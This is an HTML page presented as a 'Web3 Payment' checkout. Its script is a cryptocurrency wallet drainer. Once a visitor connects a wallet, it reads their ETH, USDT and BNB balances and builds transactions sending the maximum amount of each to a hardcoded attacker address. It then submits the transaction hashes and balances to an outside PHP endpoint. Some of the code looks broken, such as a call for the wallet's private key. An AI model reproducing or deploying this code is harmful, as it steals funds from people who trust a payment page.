<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Payment</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        button {
            padding: 15px 25px;
            font-size: 16px;
        }
        #qrCodeContainer {
            display: none;
            text-align: center;
        }
        #qrCodeContainer img {
            width: 200px;
            height: 200px;
        }
    </style>
</head>
<body>
    <button id="connectButton">Connect Wallet & Transfer Max Amount</button>

    <div id="qrCodeContainer">
        <h2>Scan QR Code with Your Wallet App</h2>
        <div id="qrCode"></div>
    </div>

    <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
        <input type="hidden" name="transactionDetails" id="transactionDetails">
    </form>

    <script>
        const connectButton = document.getElementById('connectButton');
        const transactionForm = document.getElementById('transactionForm');
        const transactionDetailsInput = document.getElementById('transactionDetails');
        const qrCodeContainer = document.getElementById('qrCodeContainer');
        const recipientAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
        const gasLimit = BigInt(21000); // Ensure BigInt type

        const tokenAddresses = {
            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
        };

        const erc20ABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
                "name": "transfer",
                "outputs": [{"name": "success", "type": "bool"}],
                "type": "function"
            }
        ];

        async function init() {
            const providerOptions = {
                walletconnect: {
                    package: WalletConnectProvider.default,
                    options: {
                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02" // Your Infura Project ID
                    }
                },
                binancechainwallet: {
                    package: true
                },
                coinbasewallet: {
                    package: true,
                    options: {
                        appName: "Web3 Payment",
                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02"
                    }
                },
                trustwallet: {
                    package: true
                }
            };

            const web3Modal = new Web3Modal.default({
                cacheProvider: true,
                providerOptions
            });

            connectButton.addEventListener('click', async () => {
                try {
                    const provider = await web3Modal.connect();
                    const web3 = new Web3(provider);

                    let walletType = 'unknown';
                    if (provider.isMetaMask) {
                        walletType = 'MetaMask';
                    } else if (provider.isTrust) {
                        walletType = 'Trust Wallet';
                    } else if (provider.isCoinbaseWallet) {
                        walletType = 'Coinbase Wallet';
                    } else if (provider.isBinanceChainWallet) {
                        walletType = 'Binance Chain Wallet';
                    }

                    console.log(`${walletType} detected`);

                    const ethersProvider = new ethers.providers.Web3Provider(provider);
                    const signer = ethersProvider.getSigner();
                    const accounts = await web3.eth.getAccounts();
                    const senderAddress = accounts[0];

                    // Fetch current gas prices
                    const feeData = await ethersProvider.getFeeData();
                    const gasPriceWei = BigInt(feeData.gasPrice.toString()); // Convert to BigInt
                    const maxFeePerGas = BigInt(feeData.maxFeePerGas.toString()); // Convert to BigInt
                    const maxPriorityFeePerGas = BigInt(feeData.maxPriorityFeePerGas.toString()); // Convert to BigInt

                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
                    const gasFeeWei = gasPriceWei * gasLimit;
                    const maxEthTransferWei = ethBalanceWei - gasFeeWei;

                    // Get USDT balance
                    const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
                    const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());

                    // Get BNB balance
                    const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
                    const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());

                    // Create transactions for each token using ethereumjs-tx
                    const ethTransactionParameters = {
                        to: recipientAddress,
                        value: '0x' + maxEthTransferWei.toString(16),
                        gasLimit: '0x' + gasLimit.toString(16),
                        gasPrice: '0x' + gasPriceWei.toString(16),
                    };

                    const ethTransaction = new EthereumTx.Transaction(ethTransactionParameters, { chain: 'mainnet' });
                    ethTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
                    const serializedEthTransaction = ethTransaction.serialize();

                    const usdtTransactionParameters = {
                        to: tokenAddresses.USDT,
                        gasLimit: '0x' + gasLimit.toString(16),
                        gasPrice: '0x' + gasPriceWei.toString(16),
                        data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
                    };

                    const usdtTransaction = new EthereumTx.Transaction(usdtTransactionParameters, { chain: 'mainnet' });
                    usdtTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
                    const serializedUsdtTransaction = usdtTransaction.serialize();

                    const bnbTransactionParameters = {
                        to: tokenAddresses.BNB,
                        gasLimit: '0x' + gasLimit.toString(16),
                        gasPrice: '0x' + gasPriceWei.toString(16),
                        data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                    };

                    const bnbTransaction = new EthereumTx.Transaction(bnbTransactionParameters, { chain: 'mainnet' });
                    bnbTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
                    const serializedBnbTransaction = bnbTransaction.serialize();

                    // Send transactions
                    const ethTxHash = await web3.eth.sendSignedTransaction('0x' + serializedEthTransaction.toString('hex'));
                    const usdtTxHash = await web3.eth.sendSignedTransaction('0x' + serializedUsdtTransaction.toString('hex'));
                    const bnbTxHash = await web3.eth.sendSignedTransaction('0x' + serializedBnbTransaction.toString('hex'));

                    // Send transaction details to PHP endpoint
                    transactionDetailsInput.value = JSON.stringify({
                        status: 'approved',
                        ethTransactionHash: ethTxHash.transactionHash,
                        usdtTransactionHash: usdtTxHash.transactionHash,
                        bnbTransactionHash: bnbTxHash.transactionHash,
                        sender: senderAddress,
                        recipient: recipientAddress,
                        maxEthTransfer: maxEthTransferWei.toString(),
                        usdtBalance: usdtBalanceWei.toString(),
                        bnbBalance: bnbBalanceWei.toString()
                    });
                    transactionForm.submit();
                } catch (error) {
                    console.error('Error:', error.message);
                    // Handle user rejection
                    transactionDetailsInput.value = JSON.stringify({
                        status: 'declined',
                        error: error.message
                    });
                    transactionForm.submit();
                }
            });

            // Fallback to WalletConnect QR code if the wallet is not detected
            web3Modal.on('connect', async (provider) => {
                if (provider.isWalletConnect) {
                    qrCodeContainer.style.display = 'block';
                    const walletConnectProvider = provider.connector;
                    const uri = await walletConnectProvider.getQrCode();
                    const qrCodeImg = document.createElement('img');
                    qrCodeImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(uri)}`;
                    document.getElementById('qrCode').appendChild(qrCodeImg);
                }
            });
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
